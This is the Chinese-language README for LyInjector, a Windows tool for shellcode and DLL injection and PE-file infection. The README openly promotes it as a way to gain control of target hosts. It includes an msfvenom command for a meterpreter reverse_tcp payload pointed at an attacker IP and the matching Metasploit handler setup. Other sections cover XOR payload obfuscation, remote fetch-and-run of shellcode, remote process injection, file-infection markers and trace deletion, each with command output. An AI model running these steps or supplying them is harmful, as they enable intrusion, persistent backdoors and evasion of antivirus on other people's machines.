# 应用层反汇编代码注入器

<br>

<div align=center>

![image](https://user-images.githubusercontent.com/52789403/224480378-709a99e3-60e5-405f-9ae3-b64261c43423.png)

</div>

<br>

<div align=center>

[![Build status](https://cdn.lyshark.com/archive/LyScript/build.svg)](https://github.com/lyshark/LyMemory) [![Crowdin](https://cdn.lyshark.com/archive/LyScript/email.svg)](mailto:me@lyshark.com)  [![OSCS Status](https://cdn.lyshark.com/archive/LyScript/OSCS.svg)](https://www.lyshark.com)

</div>

<br>

这是一款功能强大的应用层汇编代码注入软件，可以实现向特定应用层进程强制插入`DLL`模块，或插入一段`ShellCode`汇编指令集，还可以实现第三方进程的汇编级`Call`调用。它通常被用于协助渗透测试工程师完成后门内存注入功能，同时也可用于特定`ShellCode`汇编代码完整性测试。这个软件能够提高攻击者在系统渗透测试中的效率，因为它允许攻击者在目标机器上注入恶意代码并执行，从而获得更高的系统权限，实现攻击目的。当然，这款软件也可以用于安全研究人员和安全管理员的工作中，以便更好地了解攻击技术和漏洞，提高系统的安全性和稳定性。

该软件的功能非常强大，可以实现对特定进程的完全控制。具体而言，该软件可以实现以下功能：

 - 1.向特定进程内强制插入DLL模块：这使得用户可以在特定进程中执行自己编写的代码，从而实现对进程的控制。
 - 2.插入一段ShellCode汇编指令集：这是一种常见的攻击手段，通过注入恶意代码到目标进程，攻击者可以实现远程控制、窃取敏感信息等操作。
 - 3.实现第三方进程的汇编级Call调用：这个功能可以用于在目标进程中调用某个特定函数，从而实现对目标进程的控制。
 - 4.协助渗透测试工程师完成后门内存后门注入功能：通过注入恶意代码，渗透测试工程师可以模拟真实攻击情况，从而测试目标系统的安全性。
 - 5.对特定ShellCode汇编代码完整性测试功能：测试编写的ShellCode的完整性和可靠性，以确保其能够在实际攻击中正常运行。

总的来说，该软件是一款非常有用的工具，可以帮助渗透测试工程师和安全研究人员更好地了解目标系统的安全性，并且可以用于实际的攻击和渗透测试中，实现快速获取目标主机的控制权。但需要注意的是，使用该工具需要谨慎，避免对他人的系统造成不必要的损害。

## 免责声明

该项目仅用于安全技术研究与交流，禁止用于非法用途，本人不参与任何护网活动的攻击方不做黑产，若在主机中溯源到本工具，与本人没有任何关系，本人不承担任何法律责任！

## 接口调用

本工具绿色无毒，下载后可将`LyInjector.exe`源程序拷贝到`C:\Windows\System32`目录下，方便用户在任何位置都可以直接调用，目前该工具具备`23`个子功能，如下是详细的功能参数列表。

|  子命令   | 子命令作用  |
|  ----  | ----  |
| Show              | 显示当前所有可注入进程 |
| ShowDll           | 显示进程内的所有DLL模块 |
| Promote           | 尝试提升自身进程权限 |
| FreeDll           | 尝试卸载指定进程内的DLL模块 |
| GetFuncAddr       | 显示进程内特定模块内函数基址 |
| Delself           | 从系统中删除自身痕迹 |
| Format            | 将字节数组格式化为一行并打印 |
| FormatFile        | 将字节数组格式化并写出到文件 |
| Xor               | 将文本中压缩后的字节数组进行异或并输出 |
| Xchg              | 将压缩后的字符串转为字节数组格式 |
| XorArray          | 将字节数组加密/解密为字节数组格式 |
| InjectDLL         | 注入DLL模块到特定进程内 |
| InjectSelfShell   | 注入字符串到自身进程并运行 |
| InjectArrayByte   | 注入字节数组到自身进程并运行 |
| FileInjectShell   | 从文件中读入字符串并注入运行 |
| InjectProcShell   | 注入字符串到远程进程并运行 |
| InjectWebShell    | 从远程加载字符串并注入自身进程 |
| AddSection        | 在PE文件中新增一个节区 |
| InsertShellCode   | 将ShellCode插入到PE中的指定位置处 |
| RepairShellOep    | 在ShellCode末尾增加跳转回原处的指令 |
| SetSigFlag        | 设置文件感染标志 |
| EncodeInFile      | 从文件读入加密字符串并执行反弹 |
| EncodePidInFile   | 注入加密后的字符串到远程进程中 |

通常本工具并不能独立使用，多数情况下会配合`Metasploit`工具生成`ShellCode`代码使用，当使用`Metasploit`生成`ShellCode`时，可以使用本工具进行编码、注入、卸载等操作，以实现对目标系统的控制。

在使用本工具时，需要先生成符合目标系统架构的`ShellCode`然后将其转换为字节数组格式，使用本工具中的编码器进行编码，再将编码后的结果注入到目标进程中。同时，本工具还提供了多种实用的功能，如显示可注入进程、获取函数基址、新增节区等，可以帮助用户更加便捷地进行攻击操作。

通过`Metasploit`工具生成一个有效载荷，如下是32位载荷生成命令。
```c
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.93.128 LPORT=9999 -f c
```
其中`<attacker IP>`和`<attacker port>`需要替换为你自己的IP地址和端口号，这里使用了`-f c`参数指定输出C语言格式的`ShellCode`，使用了`-a x86`参数指定生成x86架构的`ShellCode`，使用了`--platform windows`参数指定生成`Windows`操作系统下的`ShellCode`，最后使用`-o`参数将生成的`ShellCode`输出到文件中。

后台侦听器的配置，使用工具时需要与载荷的位数相对应。

这些选项会告诉`Metasploit`使用哪种载荷以及将侦听器绑定到哪个IP地址和端口上。其中`ExitOnSession`选项是可选的，如果设置为`false`则在建立一个会话之后侦听器不会自动退出，可以继续等待新的连接。最后的`exploit -j`命令将侦听器设置为后台运行。
```c
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set lhost 10.0.66.22
msf6 > set lport 9999
msf6 exploit(multi/handler) > exploit
```

<br>

## 命令使用参数

**Show** LyInjector工具的子命令之一，用于显示当前所有可注入的进程。通过该命令可以快速获取当前系统内所有正在运行的进程列表，方便后续的注入操作。注入DLL模块或ShellCode时需要指定目标进程的PID，使用Show命令可以快速查看目标进程的PID，减少手动查找的时间和工作量。

以下是Show功能的基本实现步骤：

 - 获取系统中所有进程的ID和名称；
 - 遍历每个进程，判断该进程是否可以被注入；
 - 如果该进程可以被注入，则将其ID和名称输出；

```c
C:\Users\admin> LyInjector Show

[*] PID：     4 | 位数：x64 | 进程名：System
[*] PID：   124 | 位数：x64 | 进程名：Registry
[*] PID：   588 | 位数：x64 | 进程名：smss.exe
[*] PID：   872 | 位数：x64 | 进程名：csrss.exe
[*] PID：   972 | 位数：x64 | 进程名：wininit.exe
[*] PID：   980 | 位数：x64 | 进程名：csrss.exe
[*] PID：   496 | 位数：x64 | 进程名：services.exe
[*] PID：  6624 | 位数：x32 | 进程名：lyshark.exe
[*] PID：  9196 | 位数：x64 | 进程名：SearchProtocolHost.exe
[*] PID： 11376 | 位数：x64 | 进程名：LyInjector.exe
```

**ShowDll** 是一个命令行工具，它可以列出指定进程中加载的所有动态链接库（DLL）模块的名称、版本、内存地址等详细信息。这个工具可以帮助开发人员和系统管理员查看进程中加载的DLL模块，以便诊断和调试问题，也可以用于安全审计和恶意软件检测，以便发现潜在的安全问题。通过ShowDll，用户可以获得有关进程中加载的所有DLL模块的重要信息，这对于深入了解进程行为和优化系统性能都非常有用。

```c
C:\Users\admin> LyInjector ShowDll --proc lyshark.exe

[+] DLL名称:           USER32.dll | DLL基地址: 0x0000000076B70000
[+] DLL名称:        MSVCR120D.dll | DLL基地址: 0x000000006A3E0000
[+] DLL名称:         KERNEL32.dll | DLL基地址: 0x00000000773A0000
```

**Promote** 尝试提升自身进程权限，进程权限是指进程在操作系统中的权限级别，不同的权限级别可以让进程执行不同的操作。通常情况下，进程的权限级别与执行它的用户权限级别相同。但是，有时候我们需要在一个低权限的进程中执行高权限的操作，这时就需要提升进程权限。

在Windows操作系统中，进程权限级别可以分为以下几个等级（从高到低）：System、Administrator、User、Guest。提升进程权限的过程就是将进程的权限级别从当前级别提升到更高的级别，例如从User级别提升到Administrator级别。

提升进程权限需要具备一定的系统漏洞或利用技术，一般情况下，需要借助一些工具或者代码来实现。在本工具中，使用的是提权DLL的方式，通过载入提权DLL，来实现提升自身进程的权限级别。

```c
C:\Users\admin> LyInjector Promote

[+] 获取自身Token
[+] 查询进程特权
[*] 已提升为超级管理员
```

**FreeDll** FreeDll命令，它尝试卸载指定进程内的动态链接库（DLL）模块。通过FreeDll，用户可以释放一个已经被加载的DLL模块，以便重新加载更新后的DLL模块或者解决一些资源泄漏问题。然而需要注意的是，尝试卸载一个正在被使用的DLL模块可能会导致不可预测的系统行为，因此用户在使用FreeDll时需要谨慎操作。同时，FreeDll也可以用于安全审计和恶意软件检测，以便发现并解决恶意软件使用的DLL注入和劫持等问题。

```c
C:\Users\admin> LyInjector FreeDll --proc lyshark.exe --dll MSVCR120D.dll

[*] 模块卸载状态: 1
```

**GetFuncAddr** GetFuncAddr命令，它可以显示指定进程内特定模块内函数的基址（地址）。通过GetFuncAddr，用户可以获得特定模块内函数的内存地址信息，这对于一些需要直接访问特定函数的开发和调试任务非常有用。同时，GetFuncAddr也可以用于安全审计和恶意软件检测，以便发现和分析恶意软件使用的特定函数或者API调用。但需要注意的是，GetFuncAddr仅能显示进程中已经加载的模块和函数的基址信息，如果需要查找未加载的模块或者函数，则需要使用其他工具或方法。

```c
C:\Users\admin> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --func MessageBoxA

[+] 函数地址: 0x76bf0ba0

C:\Users\admin> LyInjector GetFuncAddr --proc lyshark.exe --dll user32.dll --func MessageBoxW

[+] 函数地址: 0x76bf10c0
```

**Format** Format命令，它可以将攻击载荷（payload）格式化为一行纯字符串，以便于在不同的应用场景中使用，比如在命令行中执行、发送到网络流量中或者编写脚本等。通过Format，用户可以将多行的攻击载荷转化为一行，并且可以去除一些不必要的字符和格式，使得载荷更加简洁和易于使用。这个工具常常被用于渗透测试和漏洞利用等安全领域中，帮助用户更加有效地执行攻击和实现自动化。需要注意的是，格式化后的载荷可能会因为某些原因（如编码方式、长度限制等）而无法被完全传递或解析，因此用户在使用时需要根据实际情况进行调整。

```c
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:\Users\admin> LyInjector Format --path d://shellcode.txt

fce88f0000006031d2648b52308b520c89e58b521431ff0fb74a268b7228f0b5a2566a0053ffd5
```

**FormatFile** FormatFile命令，它可以将攻击载荷（payload）格式化为一行纯字符串，并将结果写出到文本文件中。通过FormatFile，用户可以方便地将多行的攻击载荷转化为一行，并去除一些不必要的字符和格式，使得载荷更加简洁和易于使用，同时将结果写出到文本文件中，方便后续的使用和分析。

```c
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:\Users\admin> LyInjector FormatFile --path d://shellcode.txt --output d://output.txt
[+] 已储存 => d://output.txt
```

**Xor** 将文本中压缩后的字节数组进行异或并输出，它可将文本中压缩后的字节数组进行异或操作，并输出结果。通过Xor，用户可以对一些加密或压缩后的数据进行解密或解压缩，从而获得原始数据。异或操作是一种简单的位运算，可以对二进制数据进行加密和解密，常常被用于简单的加密算法中。Xor工具可以对文本中的字节数组进行异或操作，并输出解密后的结果，这对于一些需要对二进制数据进行处理的应用场景非常有用，比如恶意代码分析和加密算法破解等。需要注意的是，在进行异或操作时，需要使用相同的密钥或密钥序列，才能正确地进行加密和解密操作。

```c
C:\Users\admin> LyInjector Xor --path d://output.txt --passwd lyshark

% &{{%ssssssuspr'quw{!vqps{!vqs {z&v{!vqrwpr%%s%!tw"qu{!tqq{%s!v"qvuu"ssvp%%'v
```

**Xchg** 将压缩后的字符串转为字节数组格式，它可以将压缩后的字符串转为字节数组格式。通过Xchg，用户可以将压缩后的字符串转换为字节数组格式，以便于在程序中进行处理和使用。字节数组是一种在计算机中常用的数据类型，它可以表示二进制数据和字符数据，并且可以直接在内存中进行操作。将压缩后的字符串转换为字节数组格式，可以使得程序更加高效地处理数据，并且可以方便地进行一些加密和解密操作。Xchg工具通常被用于恶意代码分析和加密算法破解等领域，帮助用户更好地处理和分析二进制数据。需要注意的是，在进行转换时，需要确保字节数组的长度和压缩后的字符串长度一致，以避免数据丢失或错误。
```c
C:\Users\admin> LyInjector Xchg --input d://output.txt --output d://array.txt
[+] 字节已转为双字节
[*] 已写出ShellCode列表 => d://array.txt

"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";
```

**XorArray** 将字节数组加密或解密为字节数组格式，它可以将字节数组进行加密或解密，并输出加密或解密后的结果。通过XorArray，用户可以对字节数组进行简单的加密和解密操作，以保护数据的安全性。在进行加密或解密操作时，XorArray会使用特定的密钥对字节数组进行异或操作，从而生成加密或解密后的结果。由于异或操作是一种简单的位运算，因此XorArray可以非常高效地完成加密或解密操作，并且可以用于处理大量的数据。XorArray工具通常被用于网络安全和加密算法领域，帮助用户更好地保护数据的安全性，并且防止数据被篡改或窃取。需要注意的是，在进行加密或解密操作时，需要使用相同的密钥才能正确地进行加密和解密操作，否则将无法还原原始数据。

```c
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x8b\x52"
"\x0c\x89\xe5\x8b\x52\x14\x31\xff\x0f\xb7\x4a\x26\x8b\x72\x28"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:\Users\admin> LyInjector XorArray --path d://shellcode.txt --passwd lyshark
unsigned char ShellCode[] =
"\xbf\xab\xcc\x43\x43\x43\x23\x72\x91\x27\xc8\x11\x73\xc8\x11\x4f"
"\xca\xa6\xc8\x11\x57\x72\xbc\x4c\xf4\x9\x65\xc8\x31\x6b\xb3"
"\xf6\xe1\x15\x29\x43\x10\xbc\x96";
```

**InjectDLL** 注入DLL模块到特定进程内，它可以将DLL模块注入到特定进程的内存空间中，使得进程可以调用该DLL模块的函数。通过InjectDLL，用户可以在运行的进程中注入自己编写的DLL模块，从而实现一些自定义的功能，比如监视进程的行为、记录进程的日志、实现调试功能等等。在进行注入操作时，InjectDLL会使用一些特定的技术，比如远程线程注入、代码注入等等，从而将DLL模块注入到目标进程的内存空间中。需要注意的是，注入DLL模块可能会对目标进程造成一些不良影响，比如导致进程崩溃、降低进程的性能等等，因此在使用InjectDLL时需要谨慎操作，避免对系统造成不必要的损害。

```c
C:\Users\admin> LyInjector InjectDLL --proc lyshark.exe --dll d://hook.dll

[*] 模块 [ d://hook.dll ] 已被注入到 [ 6624 ] 进程
```

**InjectSelfShell** 注入ShellCode字符串到自身进程并运行，，它可以将ShellCode字符串注入到自身进程的内存空间中，并运行该ShellCode。通过InjectSelfShell，用户可以在自身进程中运行一些自定义的ShellCode，从而实现一些特定的功能，比如打开一个网络连接、执行一些系统命令等等。在进行注入操作时，InjectSelfShell会将ShellCode字符串转换为二进制形式，并将其写入自身进程的内存空间中，然后通过一些特定的技术（如跳转指令）来调用该ShellCode。需要注意的是，注入ShellCode可能会对自身进程造成一些不良影响，比如导致进程崩溃、被杀毒软件误判等等，因此在使用InjectSelfShell时需要谨慎操作，避免对系统造成不必要的损害。

```c
C:\Users\admin> LyInjector InjectSelfShell --shellcode fce88f00002c201...

[+] 解码地址: 19db64
```

**InjectArrayByte** 将字节数组注入到自身进程内，它可以将字节数组注入到自身进程的内存空间中，从而实现一些自定义的功能。

```c
"\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x89\xe5\x64\x8b\x52\x30"
"\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff"
"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49"
"\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78"
"\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5";

C:\Users\admin> LyInjector InjectArrayByte --path d://shellcode.txt
[+] 解码地址: 19df20
```

**FileInjectShell** 将一行字符串注入到自身进程内

```c
fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...

C:\Users\admin> LyInjector FileInjectShell --path d://output_shellcode.txt

[+] 解码地址: 19df20
```

**InjectWebShell** 从远程Web服务器加载字符串并注入到自身进程内

```c
192.168.1.100:80/shellcode.raw
fce88f0000006031d289e5648b52308b520c8b52140fb74a268b722831ff31c0ac3c617c022c20c1cf0d01...

C:\Users\admin> LyInjector InjectWebShell --address 192.168.1.100 --payload shellcode.raw
```

**EncodeInFile** 直接注入加密后的攻击载荷到自身进程内

```c
C:\Users\admin> LyInjector Xor --path d://output_shellcode.txt --passwd lyshark

% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 

C:\Users\admin> LyInjector EncodeInFile --path d://xor_shellcode.txt --passwd lyshark

[+] 解码ShellCode字节 => 708 bytes
[+] 格式化ShellCode字节地址 => 19df00
[*] 激活当前反弹线程 => 2a60000
```

**InjectProcShell** 注入攻击载荷到远程进程

```c
C:\Users\admin> LyInjector InjectProcShell --pid 13372 --shellcode fce88f0000006031d2648b523089e...

[*] 开始注入进程PID => 13372
[+] 打开进程: 360
[+] 已设置权限: 3866624
[*] 创建线程ID => 352
```

**EncodePidInFile** 注入加密后的攻击载荷

```c
% &{{%ssssssuspr'quw{!vqps{z&v{!vqs {!vqrw{!tqq{pr%%s%!tw"qupr s" p urt sqq qs r %s'sr 

C:\Users\admin> LyInjector EncodePidInFile --pid 8384 --path d://xor_shellcode.txt --passwd lyshark

[+] 解码ShellCode字节 => 708 bytes
[+] 读入ShellCode长度 => 1687292
[*] 开始注入进程PID => 8384 长度 => 354
[+] 打开进程: 340
[+] 已设置权限: 12451840
[*] 创建线程ID => 356
```

**AddSection** 在PE文件中新增一个节区

```c
C:\Users\admin> LyInjector AddSection --path d://lyshark.exe --section .hack --size 1024

[-] 当前DOS头: 0x2130000
[-] 当前NT头: 0x0000000002130108
[-] 定位当前节表首地址: 0x02130200
[+] 拷贝节名称: .hack
[+] 节表内存大小: 1024
[*] 节内存起始位置: 0x000B7000
[-] 节的文件大小: 4096
[*] 节的文件起始位置: 0x000A7000 => DEC: 684032
```

**InsertShellCode** 将ShellCode插入到PE中的指定位置

```c
C:\Users\admin> LyInjector InsertShellCode --path d://lyshark.exe 
--shellcode d://shellcode.txt --offset 1233

0xFC 0xE8 0x8F 0x00 0x00 0x00 0x60 0x31 0xD2 0x64 0x8B 0x52 0x30 0x8B 0x52 0x0C
0x89 0xE5 0x8B 0x52 0x14 0x31 0xFF 0x0F 0xB7 0x4A 0x26 0x8B 0x72 0x28 0xF0 0xB5
0xA2 0x56 0x6A 0x00 0x53 0xFF 0xD5

[*] 已注入 ShellCode 到PE文件
[+] 注入起始FOA => 0x000004D1 <DEC = 1233 > 注入结束FOA => 0x000004F8 <DEC = 1272 >
```

**SetSigFlag** 设置文件感染标志

```c
C:\Users\admin> LyInjector SetSigFlag --path d://lyshark.exe
[+] 文件已感染

C:\Users\admin> LyInjector SetSigFlag --path d://lyshark.exe
[-] 文件已被感染,无法重复感染.
```

**RepairShellOep** 在ShellCode末尾增加跳转回原地址处的指令

```c
C:\Users\admin>LyInjector RepairShellOep --path d://lyshark.exe 
--start_offset 1230 --end_offset 1240

[+] 获取原OEP => 0x000D8865
[+] 在 ShellCode 尾部增加JMP跳转指令: 0x90 0x90 0x90 0x90 0xB8 0x65 0x88
[*] 已增加跳转到 0x000004D8 处的代码段
[+] 修正新入口地址: 0x0007C4CE
```

## 项目地址

https://github.com/lyshark/LyInjector
